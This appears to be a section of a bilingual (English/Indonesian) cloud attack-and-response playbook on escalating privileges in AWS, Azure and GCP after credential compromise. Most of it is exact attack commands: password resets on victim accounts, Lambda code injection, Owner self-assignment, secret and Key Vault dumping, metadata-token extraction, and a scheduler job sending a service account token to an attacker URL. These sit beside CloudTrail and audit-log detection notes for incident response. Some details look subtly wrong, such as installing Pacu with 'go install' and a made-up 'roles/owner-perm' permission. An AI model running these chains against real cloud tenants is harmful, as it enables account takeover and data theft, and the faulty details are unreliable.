# w2-cred-to-pivot--deep — cloud

## 7.9 AWS — Advanced Enumeration Ladder (post-identity)

After `sts get-caller-identity` confirms identity, distinguish **principal type** first because the permission model differs: IAM user vs assumed-role (STS) vs federated (SSO) vs root vs service-linked role vs Lambda execution role. Each has a different privesc path.

### 7.9.1 Klasifikasi principal & command persis

```bash
# Identitas + siapa sesame
aws sts get-caller-identity
aws sts get-session-token --duration-seconds 129600   # hanya jika user long-term creds
aws iam get-user --user-name <from-arn> 2>/dev/null
aws iam list-attached-user-policies --user-name <u>
aws iam list-user-policies --user-name <u>
aws iam list-groups-for-user --user-name <u>
aws iam get-account-authorization-details --filter User Role Group Policy > authz.json
```

Jika ARN berakhiran `:assumed-role/<RoleName>/<SessionName>`, ambil role-nya:

```bash
aws iam get-role --role-name <RoleName>
aws iam list-attached-role-policies --role-name <RoleName>
aws iam list-role-policies --role-name <RoleName>
aws iam get-role-policy --role-name <RoleName> --policy-name <InlineName>
```

### 7.9.2 Autonomous enumeration ladder (safe, without major noise)

| Stage | Objective | Exact command | CloudTrail trace |
|---|---|---|---|
| E1 | identity | `aws sts get-caller-identity` | `GetCallerIdentity` (not recorded in data events, only in CloudTrail management if org trail) |
| E2 | account-level recon | `aws iam get-account-authorization-details` | `GetAccountAuthorizationDetails` |
| E3 | role list | `aws iam list-roles` | `ListRoles` |
| E4 | policy inline role target | `aws iam get-role-policy --role-name R --policy-name P` | `GetRolePolicy` |
| E5 | policy versions (default) | `aws iam get-policy --policy-arn A` + `aws iam get-policy-version --policy-arn A --version-id vN --query 'PolicyVersion.Document'` | `GetPolicy`, `GetPolicyVersion` |
| E6 | policy attach sebagai managed | `aws iam list-policies --scope Local --query 'Policies[?AttachmentCount>0]'` | `ListPolicies` |
| E7 | boundary & permission | `aws iam get-role --role-name R --query 'Role.PermissionsBoundary'` | `GetRole` |
| E8 | ekspos resource target | `aws s3 ls`, `aws ec2 describe-instances`, `aws secretsmanager list-secrets` | masing-masing Describe/List |
| E9 | credentials in resources | `aws secretsmanager get-secret-value --secret-id X`, `aws ssm get-parameters-by-path --path / --recursive --with-decryption` | `GetSecretValue`, `GetParametersByPath` |
| E10 | escalation liveness check | `aws iam simulate-principal-policy` (dry-run) or `pacu` | `SimulatePrincipalPolicy` (can be detected because it is called from outside the console) |

Operational note: **`GetCallerIdentity` does not have a `resources` field** so it does not appear in standard CloudTrail trails (management events recorded are only those with resources; many orgs only record `Resources[].ARN`). If the org trail records all management events without resources, `GetCallerIdentity` still appears — check `eventName=GetCallerIdentity` in Lake/Athena.

### 7.9.3 Pacu: mapping command → module

```bash
# install & run
go install github.com/RhinoSecurityLabs/pacu@latest
pacu
# session setup
import_keys default --access-key-id AKIA... --secret-access-key ...
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
run whoami
run iam__privesc_scan --scan-only
```

Modules that must not be skipped during quick triage: `iam__enum_permissions`, `iam__privesc_scan`, `s3__enum`, `secrets__enum`, `lambda__enum`, `ec2__enum`, `sts__assume_role` (for cross-account paths hidden in trust policy).

### 7.9.4 Privesc path per permission — advanced table (new variants)

The table in the previous section already covers classic paths (CreatePolicyVersion, AttachUserPolicy, PassRole+RunInstances, UpdateAssumeRolePolicy, CreateAccessKey). The following are **not yet covered**, and many were only used in 2023+:

| Key permission | Primitive | Minimal payload (exact) | CloudTrail eventName |
|---|---|---|---|
| `iam:CreateServiceSpecificCredential` | kredensial CodeCommit HTTPS/SSH sebagai user target | `aws iam create-service-specific-credential --user-name V --service-name codecommit.amazonaws.com` | `CreateServiceSpecificCredential` |
| `iam:UpdateLoginProfile` (without `CreateLoginProfile`) | reset password of existing console user | `aws iam update-login-profile --user-name V --password 'N3w!Pass' --no-password-reset-required` | `UpdateLoginProfile` |
| `iam:PutUserPolicy` + policy that allows `sts:AssumeRole` to admin role | disguise via managed condition | `aws iam put-user-policy --user-name V --policy-name P --policy-document file://p.json` | `PutUserPolicy` (formerly), `CreatePolicyVersion`-like effect via user policy |
| `iam:PutRolePolicy` on a role that can already be assumed | add inline without changing trust | `aws iam put-role-policy --role-name R --policy-name P --policy-document file://p.json` | `PutRolePolicy` |
| `lambda:UpdateFunctionCode` on a function with a strong role | inject code → its function role | `aws lambda update-function-code --function-name F --zip-file fileb://x.zip` | `UpdateFunctionCode20150331v2` |
| `lambda:CreateFunction` + `iam:PassRole` | buat function baru assume role admin | `aws lambda create-function --function-name X --runtime python3.12 --role arn:aws:iam::ACCT:role/AdminRole --handler h --zip-file fileb://x.zip` | `CreateFunction20150331` |
| `lambda:AddPermission` (cross-account) | public endpoint that invokes with its own role | `aws lambda add-permission --function-name F --statement-id s --action lambda:InvokeFunction --principal ACCT2` | `AddPermission20150331v2` |
| `glue:CreateDevEndpoint` / `glue:UpdateDevEndpoint` | shell via Glue with Glue role | `aws glue create-dev-endpoint --endpoint-name x --role-arn arn:aws:iam::A:role/GlueAdmin --public-key file://k.pub` | `CreateDevEndpoint` |
| `cloudformation:CreateStack` + `iam:PassRole` + `CAPABILITY_IAM` | execution role upgrade via `AWS::IAM::Policy` inline | `aws cloudformation create-stack --stack-name x --template-body file://t.yaml --capabilities CAPABILITY_IAM --role-arn arn:aws:iam::A:role/CFNExec` | `CreateStack` |
| `cloudformation:UpdateStack` on a stack with a strong role | inject `AWS::IAM::Policy` resource | `aws cloudformation update-stack --stack-name S --template-body file://t.yaml --capabilities CAPABILITY_IAM` | `UpdateStack` |
| `datapipeline:CreatePipeline` + `datapipeline:PutPipelineDefinition` + `iam:PassRole` | instance role via DataPipeline | `aws datapipeline create-pipeline --name p --unique-id p` then `put-pipeline-definition` with `role` object | `CreatePipeline`, `PutPipelineDefinition` |
| `sagemaker:CreateNotebookInstance` + `iam:PassRole` | notebook with target role | `aws sagemaker create-notebook-instance --notebook-instance-name n --instance-type ml.t2.medium --role-arn arn:aws:iam::A:role/Target` | `CreateNotebookInstance` |
| `sagemaker:CreatePresignedNotebookInstanceUrl` | akses notebook existing | `aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name n` | `CreatePresignedNotebookInstanceUrl` |
| `codebuild:StartBuild` on a project with a role | enviroment variable injection / buildspec override | `aws codebuild start-build --project-name P --environment-variables-override name=X,value=...` | `StartBuild` |
| `ecs:RegisterTaskDefinition` + `ecs:RunTask` + `iam:PassRole` | role container | `aws ecs register-task-definition --cli-input-json file://td.json` | `RegisterTaskDefinition` |
| `ecs:UpdateService` on a service with a role | swap task def | `aws ecs update-service --cluster C --service S --task-definition new:1` | `UpdateService` |
| `ssm:SendCommand` + role that has SSM core | RCE on instance | `aws ssm send-command --document-name AWS-RunShellScript --instance-ids i-xxx --parameters commands=id` | `SendCommand` |
| `ssm:StartSession` / `ssm:ResumeSession` | interactive shell | `aws ssm start-session --target i-xxx` | `StartSession` |
| `sts:AssumeRole` on a role chain ending in admin | role chaining | `aws sts assume-role --role-arn arn:aws:iam::A:role/Chain1 --role-session-name x` | `AssumeRole` (chained per hop) |
| `iam:GetFederationToken` | STS token from IAM user → subset of user's permissions (trick: if user has broad policy but is inactive, federation token can be looser in MFA cases) | `aws sts get-federation-token --name x --policy file://p.json` | `GetFederationToken` |
| `iam:PassRole` to `ec2:RunInstances` with `--instance-profile` | instance profile role | (see variations in 7.9.5) | `RunInstances` + `PassRole` (if trail records role resource) |

### 7.9.5 `iam:PassRole` variants that bypass condition — 2023+ edge cases

Conditions on `iam:PassRole` in the role resource are often `iam:PassedToService` or `iam:AssociatedResourceArn`. Bypasses that still work:

```bash
# target role yang diizinkan untuk ec2 → tetap bisa via create-launch-template + versi
aws ec2 create-launch-template --launch-template-name lt --version-description v \
  --launch-template-data '{"ImageId":"ami-xxx","InstanceType":"t3.micro","IamInstanceProfile":{"Name":"TargetProfile"}}'
aws ec2 run-instances --launch-template LaunchTemplateName=lt --count 1
# CloudTrail: CreateLaunchTemplate, RunInstances (PassRole TIDAK muncul sebagai event terpisah, melainkan sebagai authorization check pada CreateLaunchTemplate)
```

Important detection fact: **`iam:PassRole` is not an API — there is no `PassRole` event in CloudTrail.** It appears as an `errorCode`/`authorization` field in the caller's event (`RunInstances`, `CreateFunction`, `CreateStack`, `RunTask`, `CreateNotebookInstance`). This is a major trap during IR: many analysts search for `eventName=PassRole` and find nothing.

### 7.9.6 Condition bypass `iam:PolicyARN` & `aws:ResourceAccount`

Rotation check that is often missed: a managed policy already attached in your own account can be used without a new `AttachUserPolicy`; simply `iam:CreatePolicyVersion` on that managed policy — this path does **not** trigger `AttachUserPolicy` but triggers `CreatePolicyVersion`.

```bash
aws iam create-policy-version --policy-arn arn:aws:iam::A:policy/SharedP --policy-document file://admin.json --set-as-default
# CloudTrail: CreatePolicyVersion (managed policy change); ini "stealth" karena tidak ada Attach/Detach
```

### 7.9.7 Varian STS & sesi

| Technique | Detail | CloudTrail Event | Trap |
|---|---|---|---|
| `sts:AssumeRoleWithSAML` | if the SAML IdP trust is loose (`Condition` only `StringEquals` audience) | `AssumeRoleWithSAML` | source `principalId` = SAML subject; often lacks `userIdentity.type=AssumedRole` in old logs |
| `sts:AssumeRoleWithWebIdentity` (EKS IRSA) | OIDC provider condition `sub` wildcard → any role | `AssumeRoleWithWebIdentity` | log contains `webIdFederationData` |
| `iam:GetSessionToken` + MFA | if a user has MFA but it is not enforced, an attacker can use the user without MFA against the API | `GetSessionToken` | session token has `mfaAuthenticated=false` — key filter |
| `sts:TagSession` abuse | tags to bypass `aws:PrincipalTag` condition | appears as the `requestParameters.tags` field in `AssumeRole` | check `transitiveTagKeys` |

### 7.9.8 CloudTrail traces that must be checked per IR stage (AWS)

```bash
# event yang paling sering kelewat karena bukan "data event"
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ListRoles
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetAccountAuthorizationDetails
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetRolePolicy
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=SimulatePrincipalPolicy
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetSecretValue
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetParametersByPath
```

Pivots from CloudTrail:
- Field `userIdentity.sessionContext.sessionIssuer.arn` → the session role used.
- Field `userIdentity.sessionContext.sessionIssuer.userName` for legacy assumed roles.
- `userIdentity.accessKeyId` → match with `iam list-access-keys` per user / `sts get-caller-identity` of the usage (not the owner).
- Consecutive `errorCode=AccessDenied` with varied `eventSource` = enumeration script (pacu/cloudfox).

## 7.10 Azure — ladder paralel

### 7.10.1 Principal classification (distinguish the ones that often cause mis-triage)

| Identity type | Token characteristic | Ladder start |
|---|---|---|
| User (interactive) | `idtyp=user`, `upn` ada | `az ad signed-in-user show` |
| Service principal (app) | `idtyp=app`, `oid` app obj | `az ad sp show --id <oid>` |
| Managed identity (system/user assigned) | `idtyp=app`, `oid` = MSI object, no `az ad` obj for the instance | `az vm identity show` / IMDS |
| Workload identity federation (AKS) | OIDC issuer token | check `federatedIdentityCredentials` on the app |
| Azure DevOps service connection | token ADO → SP | cek `az devops service-endpoint list` |

```bash
# handshake
az account show
az ad signed-in-user show --query '{id:id,upn:userPrincipalName}' -o jsonc   # user
az ad sp show --id $(az account show --query user.name -o tsv) 2>/dev/null   # SP
# management group & subscription reach
az account management-group list -o table
az account list --all -o table
az role assignment list --assignee <oid> --all --include-inherited -o table
az role definition list --custom-role-only true -o table
```

### 7.10.2 Enumeration ladder Azure (post-identity)

| Stage | Command | Activity Log `operationName` |
|---|---|---|
| E1 | `az account show` (local) | not recorded |
| E2 | `az role assignment list --assignee <oid> --all` | `Microsoft.Authorization/roleAssignments/read` |
| E3 | `az role definition list --custom-role-only true` | `Microsoft.Authorization/roleDefinitions/read` |
| E4 | `az graph query -q 'Resources \| project id,type'` | `Microsoft.ResourceGraph/resources/read` |
| E5 | `az rest --method GET --url https://graph.microsoft.com/v1.0/servicePrincipals/<oid>/appRoleAssignments` | Graph `List appRoleAssignments` |
| E6 | `az rest --method GET --url https://graph.microsoft.com/v1.0/applications` | Graph `List applications` |
| E7 | `az keyvault secret list --vault-name K` | `Microsoft.KeyVault/vaults/secrets/read` |
| E8 | `az deployment group list -g G` (cari secure params) | `Microsoft.Resources/deployments/read` |
| E9 | `az rest --method POST --url 'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess'` (UAA — if successful, a sign of global ownership) | `Microsoft.Authorization/elevateAccess/action` |

### 7.10.3 Azure privesc paths per permission — continued table

| Permission/control plane | Primitif | Command persis | Activity Log |
|---|---|---|---|
| `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` | attach a powerful-role MI to an attacker-controlled resource | `az vm identity assign -g G -n V --identities /subscriptions/S/resourceGroups/G/providers/Microsoft.ManagedIdentity/userAssignedIdentities/Target` | `Microsoft.Compute/virtualMachines/write` |
| `Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials/write` | OIDC impostor → MI token from outside | `az rest --method PUT --url '.../federatedIdentityCredentials/evil' --body @fic.json` | `microsoft.managedidentity/userassignedidentities/federatedidentitycredentials/write` |
| `Microsoft.Automation/automationAccounts/runbooks/draft/write` + `.../publish/action` | code exec in Automation Account (Hybrid Worker) | `az automation runbook replace-content` → `publish` → `start` | `.../runbooks/draft/write`, `.../publish/action`, `.../runbooks/draft/publish/action` |
| `Microsoft.Automation/automationAccounts/credentials/write` | simpan credential baru (privesc bila runbook berikut jalan sebagai akun automation) | `az automation credential create` | `.../credentials/write` |
| `Microsoft.ContainerService/managedClusters/listClusterAdminCredential/action` | ambil kubeconfig admin AKS | `az aks get-credentials -g G -n C --admin` | `.../listClusterAdminCredential/action` |
| `Microsoft.ContainerService/managedClusters/listClusterUserCredential/action` | user kubeconfig (possibly looser than AKS RBAC) | `az aks get-credentials -g G -n C` | same |
| `Microsoft.ContainerRegistry/registries/importImage/action` | pull an image from another registry into an attacker-attached registry | `az acr import -n T --source <src> -t repo/img` | `.../importImage/action` |
| `Microsoft.KeyVault/vaults/secrets/read` on a vault with a loose access policy | secret curl | `az keyvault secret show --vault-name K --name n` | `Microsoft.KeyVault/vaults/secrets/read` |
| `Microsoft.KeyVault/vaults/accessPolicies/write` | grant self permission on the vault | `az keyvault set-policy -n K --upn <me> --secret-permissions get list` | `.../accessPolicies/write` |
| `Microsoft.Compute/virtualMachines/runCommand/action` | RCE sebagai MI VM | `az vm run-command invoke -g G -n V --command-id RunShellScript --scripts 'id'` | `.../runCommand/action` |
| `Microsoft.Compute/virtualMachineScaleSets/virtualMachines/runCommand/action` | idem VMSS | `az vmss run-command invoke` | idem |
| `Microsoft.Resources/deployments/write` + Owner role on the scope | ARM template places a new role assignment | `az deployment group create -g G --template-file t.json --parameters @p.json` | `Microsoft.Resources/deployments/write` |
| `Microsoft.Authorization/roleAssignments/write` | role Assignment langsung | `az role assignment create --assignee <me> --role Owner --scope /subscriptions/S` | `.../roleAssignments/write` |
| `Microsoft.Authorization/roleDefinitions/write` | create a custom role then assign it | `az role definition create --role-definition r.json` | `.../roleDefinitions/write` |
| `Microsoft.Graph` `Application.ReadWrite.All` | add a client secret to the target app → authenticate as another app's SP | `az ad app credential reset --id <appObjId> --append` | Graph `addPassword` |
| `Directory.ReadWrite.All` / `AppRoleAssignment.ReadWrite.All` | assign app role (mis. `RoleManagement.ReadWrite.Directory` → jadi Global Admin) | `az rest --method POST --url '.../servicePrincipals/<oid>/appRoleAssignedTo' --body @a.json` | Graph `add appRoleAssignedTo` |
| `Microsoft.Sql/servers/administrators/write` | set the SQL AD admin to self | `az sql server ad-admin create -g G -s S -u <me> -i <objId>` | `.../administrators/write` |
| `Microsoft.Storage/storageAccounts/listKeys/action` | ambil key → akses penuh storage | `az storage account keys list -g G -n S` | `.../listKeys/action` |
| `Microsoft.Web/sites/config/list/action` + `.../publish` | ambil publishing profile → deploy code | `az webapp deployment list-publishing-credentials` | `.../config/list/action` |
| `Microsoft.DevTestLab/labs/users/serviceFabrics/...` | RCE via Service Fabric lab (often forgotten in SP) | `az rest` create Service Fabric lab resource | `Microsoft.DevTestLab/...` |

### 7.10.4 Jejak & jebakan Azure

- **Activity Log default retention 90 days**; longer requires "Diagnostic settings" → Log Analytics. Many triages are wrong because they only read Activity Log and conclude "no enumeration" when the source is Log Analytics.
- **ARM Authorization cache** — new role assignments take up to ~10 minutes to be effective in the token; enumeration that "fails" may be due to cache, not permission.
- **`az rest` and Graph** do not appear in Activity Log but in Entra `AuditLogs` (`directoryAudits`). For IR a union is mandatory:
  ```bash
  az rest --method GET --url 'https://graph.microsoft.com/v1.0/auditLogs/directoryAudits?$filter=activityDateTime ge 2024-01-01T00:00:00Z' |
    jq '.value[] | {activity: .activityDisplayName, actor: .initiatedBy.user.userPrincipalName, target: .targetResources[].displayName}'
  ```
- **`elevateAccess`** (UAA) does not appear in the subscription Activity Log but in tenant-level audit — check `directoryAudits` filter `activityDisplayName eq 'Add member to role'` or `Enable User Access Administrator`.
- **Conditional Access leaves a different signal** (Sign-in logs), not Activity Log.
- **Managed identity token request** (IMDS `169.254.169.254`) is not recorded in CloudTrail/Azure Activity — it can only be seen in VM logs / Defender for Cloud alerts. So there is no server-side trace of token issue, only the trace of token usage on the API afterwards.

### 7.10.5 Command set lengkap (triage cepat Azure)

```bash
# identity & reach
az account show
az account list --all -o tsv --query '[].id'
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all --include-inherited
az ad app list --all --query '[].{appId:appId,name:displayName}' -o table
az ad sp list --all --query '[].{appId:appId,name:displayName}' -o table # perlu Directory.Read.All
# credentials
az keyvault list --query '[].name' -o tsv | xargs -I{} az keyvault secret list --vault-name {} 2>/dev/null
az storage account list --query '[].{n:name,rg:resourceGroup}'
# escalation liveness (safe, read-only-ish)
az rest --method POST --url 'https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01'  # <= hanya jika scope UAA; cek 200 vs 403
```

## 7.11 GCP — ladder paralel

### 7.11.1 Klasifikasi principal

| Type | Token characteristic | Ladder start |
|---|---|---|
| User (`gcloud auth login`) | `email` @gmail/workspace | `gcloud auth list`, `gcloud config list` |
| Service account key (`credentials.json`) | `client_id` numerik | `gcloud auth activate-service-account --key-file=...` |
| GCE/GKE/Cloud Run metadata MI | token from metadata server | check `gcloud auth print-access-token` on the instance |
| Workload Identity Federation (GitHub OIDC dll) | `sts.googleapis.com` token exchange | cek `workloadIdentityPools` |
| Impersonation (delegated) | `serviceAccountTokenCreator` | `gcloud auth print-access-token --impersonate-service-account=<sa>` |

```bash
gcloud auth list
gcloud config get-value project
gcloud projects get-iam-policy $(gcloud config get-value project) --format=json > proj-iam.json
gcloud iam service-accounts list --format=table
gcloud organizations list
gcloud resource-manager folders list --organization=<org> # jika ada org-level read
```

### 7.11.2 Enumeration ladder GCP

| Stage | Command | Audit Log methodName |
|---|---|---|
| E1 | `gcloud auth list` / `gcloud config list` | local |
| E2 | `gcloud projects get-iam-policy <p>` | `GetIamPolicy` (Admin Activity) |
| E3 | `gcloud asset search-all-iam-policies --scope=projects/<p>` | `assets.searchAllIamPolicies` (Data Access — butuh Data Access log on) |
| E4 | `gcloud asset search-all-resources --scope=projects/<p>` | `assets.searchAllResources` (Data Access) |
| E5 | `gcloud iam service-accounts list --project <p>` | `ListServiceAccounts` |
| E6 | `gcloud iam service-accounts keys list --iam-account=<sa>` | `ListServiceAccountKeys` |
| E7 | `gcloud secrets list --project <p>` | `ListSecrets` (Admin Activity — tercatat) |
| E8 | `gcloud secrets versions access latest --secret=<s>` | `AccessSecretVersion` (Data Access — butuh explicit enable) |
| E9 | `gcloud storage ls -p <p>` | `storage.objects.list` (Data Access) |
| E10 | `gcloud compute instances list --project <p>` | `compute.instances.list` (Data Access for list; Admin Activity for get) |
| E11 | `gcloud iam roles list --project <p>` + `gcloud iam roles describe <r>` | `ListRoles`, `GetRole` |
| E12 | `gcloud beta asset analyze-iam-policy --full-explorer` / `gcloud policy-intelligence` | `assets.analyzeIamPolicy` |

Main pitfall: **Admin Activity log is enabled by default; Data Access log is NOT enabled by default.** So enumeration via `secrets list`, `asset search-all-*`, `storage ls` may **not** leave a trace in the logs unless Data Access is enabled. This is a fundamental difference from AWS/Azure. The IR team must check `gcloud logging settings describe` per resource.

### 7.11.3 GCP privesc paths — continued table

| Key permission/role | Primitive | Exact command | methodName (Admin Activity) |
|---|---|---|---|
| `iam.serviceAccountKeys.create` | target SA key → direct auth | `gcloud iam service-accounts keys create k.json --iam-account=<sa>@<p>.iam.gserviceaccount.com` | `CreateServiceAccountKey` |
| `iam.serviceAccounts.getAccessToken` | direct token for SA | `gcloud auth print-access-token --impersonate-service-account=<sa>@...` | `GenerateAccessToken` (Data Access! often not recorded) |
| `iam.serviceAccounts.signBlob` / `signJwt` | forge JWT → GCP token mint (if `iam.serviceAccounts.getAccessToken` is not available) | `gcloud iam service-accounts sign-jwt payload.json signed.txt --iam-account=<sa>` | `SignJwt`, `SignBlob` (Data Access) |
| `iam.serviceAccounts.actAs` + Compute | attach SA to attacker-controlled instance | `gcloud compute instances set-service-account <i> --service-account=<sa> --scopes=cloud-platform` (or create inst with `--service-account`) | `compute.instances.setServiceAccount`, `compute.instances.insert` |
| `iam.serviceAccounts.actAs` + Cloud Functions | deploy function ber-SA | `gcloud functions deploy f --runtime=python311 --trigger-http --service-account=<sa> --source=src/ --entry-point=h` | `google.cloud.functions.v1.CloudFunctionsService.CreateFunction` |
| `iam.serviceAccounts.actAs` + Cloud Run | deploy service ber-SA | `gcloud run deploy s --image gcr.io/x/y --service-account=<sa> --region=us-central1 --allow-unauthenticated` | `google.cloud.run.v1.Services.CreateService` |
| `iam.serviceAccounts.actAs` + GKE | create pod with SA via kubectl | `kubectl run p --image=alpine --restart=Never --overrides='{"spec":{"serviceAccountName":"<sa>"}}'` | `k8s.io` audit, not GCP Admin Activity |
| `iam.roles.update` | add permissions to a custom role already assigned to self | `gcloud iam roles update <role> --project=<p> --add-permissions=roles/owner-perm` | `UpdateRole` |
| `iam.roles.create` + `iam.roleBindings`/policy write | superuser custom role then bind | `gcloud iam roles create evil --project=<p> --permissions=...` then policy patch | `CreateRole`, `SetIamPolicy` |
| `resourcemanager.projects.setIamPolicy` | SetIamPolicy langsung | `gcloud projects add-iam-policy-binding <p> --member=user:<me> --role=roles/owner` | `SetIamPolicy` |
| `resourcemanager.folders.setIamPolicy` | escalation at folder/org | `gcloud resource-manager folders add-iam-policy-binding <f> --member=user:<me> --role=roles/owner` | `SetIamPolicy` (folder resource) |
| `deploymentmanager.deployments.create` | apply template with host SA | `gcloud deployment-manager deployments create d --config=config.yaml` | `deploymentmanager.deployments.create` |
| `cloudfunctions.functions.create` + `actAs` | function deploy | (see above) | CreateFunction |
| `composer.environments.create` | Composer worker SA = host escape | `gcloud composer environments create e --location=... --service-account=<sa>` | `google.cloud.orchestration.airflow.service.v1.Environments.CreateEnvironment` |
| `notebooks.instances.create` | notebook ber-SA | `gcloud notebooks instances create n --vm-image-project=deeplearning-platform-release ...` | `CreateInstance` |
| `dataproc.clusters.create` | cluster ber-SA | `gcloud dataproc clusters create c --service-account=<sa>` | `dataproc.ClusterController.CreateCluster` |
| `bigquery.jobs.create` | query with billing/executor SA | `bq query --use_legacy_sql=false 'SELECT 1'` (host SA via run-as) | `JobService.InsertJob` |
| `cloudscheduler.jobs.create` | HTTP job to attacker endpoint with target SA | `gcloud scheduler jobs create http j --schedule='* * * * *' --uri=https://attacker/ --oidc-service-account-email=<sa>` | `CreateJob` |
| `iam.workloadIdentityPools.providers.update` | OIDC provider condition longgar → mint SA token via STS | `gcloud iam workload-identity-pools providers update-oidc <p> --attribute-condition='true'` | `providers.update` |

### 7.11.4 Jejak Audit Log GCP — jebakan praktis

```bash
# ambil semua Admin Activity (default on)
gcloud logging read 'logName="projects/PROJECT/logs/cloudaudit.googleapis.com%2Factivity"' \
  --freshness=7d --format=json | jq -r '.[] | [.timestamp, .protoPayload.methodName, .protoPayload.authenticationInfo.principalEmail] | @tsv'

# Data Access (harus di-enable dulu)
gcloud logging read 'logName="projects/PROJECT/logs/cloudaudit.googleapis.com%2Fdata_access"' \
  --freshness=7d --format=json
```

Operational points:
- **`GenerateAccessToken` and `GenerateIdToken` are Data Access** — if Data Access log is off (default), impersonation leaves no trace.
- **`signJwt` / `signBlob` are also Data Access.** Enumeration that "succeeds but has no log" is usually because of this.
- **Activity Log does not cover Kubernetes/GKE workload calls to K8s SA**: it is only recorded in GKE audit log and Cloud Logging with `logName=k8s_cluster`.
- **`SetIamPolicy` is recorded, but `GetIamPolicy` is also Admin Activity** — so many `GetIamPolicy` = indication of enumeration even if Data Access is off.
- **Service Account `actAs`** does not produce a separate audit event when used from `gcloud`; its trace is `authenticationInfo.principalEmail=<user>` + `serviceAccountDelegationInfo.firstPartyPrincipal=<sa>` in the target event.
- **`asset.searchAllResources` / `searchAllIamPolicies`** are Data Access — reconnaissance will be "silent" if Data Access logging is off.

### 7.11.5 Command set lengkap (triage cepat GCP)

```bash
# identity & reach
gcloud auth list --format='value(account,status)'
gcloud projects list --format='value(projectId)'
gcloud organizations list --format='value(name,displayName)'
gcloud projects get-iam-policy <p> --format=json > iam.json
gcloud iam service-accounts list --project <p>
gcloud iam roles list --project <p>

# fresh cred extraction
gcloud auth print-access-token
gcloud auth print-identity-token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# escalation liveness (baca-only dulu)
gcloud iam roles describe roles/editor
gcloud asset search-all-resources --scope=projects/<p> --limit=5 # konfirmasi asset API berjalan
```

## 7.12 Varian lintas-cloud & edge case 2024–2025

| Topik | AWS | Azure | GCP |
|---|---|---|---|
| **OIDC workload federation** | IAM OIDC provider `sub` wildcard → `sts:AssumeRoleWithWebIdentity`; event `AssumeRoleWithWebIdentity` | Federated Identity Credential on app registration / user-assigned MI; token issuer condition `sub` too loose | Workload Identity Pool `attributeCondition='true'` → `sts.googleapis.com` issues SA token; methodName `google.identity.sts.v1.SecurityTokenService.ExchangeToken` (Data Access!) |
| **SSO/conditional bypass** | `iam:CreateLoginProfile` for SSO user (does not require console on IdP) | Loose per-app authentication policy; `az rest` from non-CA network | `gcloud auth login --no-browser` + service account key |
| **Trust policy condition wildcard** | `"Principal": {"AWS": "*"}` on `sts:AssumeRole` often appears from old templates | `appRoleAssignedTo` without restriction | `attributeCondition: "true"` in WIF provider |
| **Cross-account/tenant** | `AssumeRole` `ExternalId` that is missing/weak | Multi-tenant app + `adminConsent` | `iam.workloadIdentityPools` across projects |
| **Token cache pitfall** | `sts` token 1 hour; `AssumeRole` chain can be 12 hours with `DurationSeconds` (max role chaining 1 hour per hop) | ARM token ~1 hour, refresh via refresh token according to CA/SIF | `gcloud auth print-access-token` 1 hour; `print-identity-token` <=1 hour |
| **Credentials in CI/CD** | CodeBuild env var, GitHub OIDC to IAM | ADO service connection ID + secret, GitHub OIDC to Entra app | WIF from GH Actions, GitLab OIDC |
| **Credentials in artifacts** | `.aws/credentials` in AMI/EBS snapshot, EC2 userdata, ECS task env, EKS secrets, CodeCommit repo, public S3 bucket | ARM template parameter, pipeline secret (devops), App Settings Function, Key Vault access policy misconfig | `credentials.json` in VM image, Cloud Build trigger secret, public GCS object, Composer Airflow connection |

### 7.12.1 Edge case token & auth (baru 2024–2025)

- **AWS `sts:AssumeRoot`** (Nov 2024): allows a principal with `sts:AssumeRoot` to assume a scoped root session per member account (only for the Org management account). `AssumeRoot` appears in CloudTrail — detection: eventName `AssumeRoot` with `requestParameters.taskPolicyArn` non-null. This is a path that previously did not exist for "root-ish" access without root.
- **AWS IAM Access Analyzer follow-up 2024**: `iam:SimulatePrincipalPolicy` can now be used for assertions on external access; enumeration with `SimulatePrincipalPolicy` is still logged (same eventName).
- **Azure `ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials` GA**: allows issuance of MI tokens from arbitrary issuers → **new 2024 combination** for persistence without an SP key. Audit call: `microsoft.managedidentity/userassignedidentities/federatedidentitycredentials/write`.
- **Azure `Authentication Methods` / `Temporary Access Pass`** misuse: if an attacker has `UserAuthenticationMethod.ReadWrite.All`, they can set a TAP for the victim → login. Audit `directoryAudits` activity `Admin registered security info`.
- **GCP `GenerateAccessToken` audit Data Access** (since ~2023): if enabled, SA token minting is logged with `protoPayload.methodName="GenerateAccessToken"` and `serviceAccountDelegationInfo`.
- **GCP `sts ExchangeToken` Data Access**: all WIF exchanges — if logging is on, grep `ExchangeToken` in the Data Access log.
- **AWS EKS Pod Identity** (GA 2023): replaces IRSA. Pod identity association can be used for privesc if `eks:CreatePodIdentityAssociation` is available + `iam:PassRole` → pod as any role. Check events `CreatePodIdentityAssociation`, `TagResource` in EKS.
- **Cloud Run `run.services.update`** + `iam.serviceAccounts.actAs`: swap SA to admin SA, traffic remains. Audit `google.cloud.run.v1.Services.ReplaceService`.
- **Azure Container Apps** analog: `Microsoft.App/containerApps/write` + `assign` MI.

### 7.12.2 Operational enumeration pitfalls (all clouds)

- **"Silent" enumeration in GCP Data Access-off** — do not conclude "no activity" until `logging settings` per project is checked.
- **`GetCallerIdentity` in AWS has no resources** — many management event trails filter based on the `resources` field, so this event can be absent. Do not use its absence as evidence.
- **Azure Activity Log is only control plane** — enumeration via Graph (`az rest`) goes into Entra `AuditLogs`, not Activity Log. IR must union.
- **`PassRole`/`actAs` are not events in AWS and GCP** — their trace is as an authorization check in the caller event. Grep `errorCode`/`authorizationError` on the target event, or `serviceAccountDelegationInfo` in GCP.
